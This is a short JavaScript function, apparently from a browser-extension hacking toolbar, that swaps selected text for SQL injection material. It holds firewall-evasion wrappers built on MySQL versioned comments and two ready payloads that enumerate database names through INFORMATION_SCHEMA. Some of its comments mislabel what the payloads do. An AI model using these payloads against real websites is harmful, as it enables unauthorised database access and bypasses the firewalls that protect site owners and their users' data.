function setWaf(id) {
	switch (id) {
		/*------STRING------*/
		case "waf1":
			getSelectedText(function(str) {
				setSelectedText("/*!" + str + "------*/");
			});
			break;

		/*------50000 STRING------*/
		case "waf2":
			getSelectedText(function(str) {
				setSelectedText("/*!50000" + str + "------*/");
			});
			break;

		/*------12345 STRING------*/
		case "waf3":
			getSelectedText(function(str) {
				setSelectedText("/*!12345" + str + "------*/");
			});
			break;

		/*------13337 STRING------*/
		case "waf4":
			getSelectedText(function(str) {
				setSelectedText("/*!13337" + str + "------*/");
			});
			break;

		/*------13337 STRING------*/
		case "waf5":
			getSelectedText(function(str) {
				setSelectedText("/*!13337" + str + "------*/");
			});
			break;

		/*------GET TABLES GROUP_CONCAT------*/
		case "wafset1":
			getSelectedText(function(str) {
				setSelectedText("(SELECT+CONCAT(COUNT(schema_name),0x202f20446174616261736573)+FROM+INFORMATION_SCHEMA.SCHEMATA)");
			});
			break;

		/*------GET COLUMNS GROUP_CONCAT------*/
		case "wafset2":
			getSelectedText(function(str) {
				setSelectedText("(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)");
			});
			break;
	}
}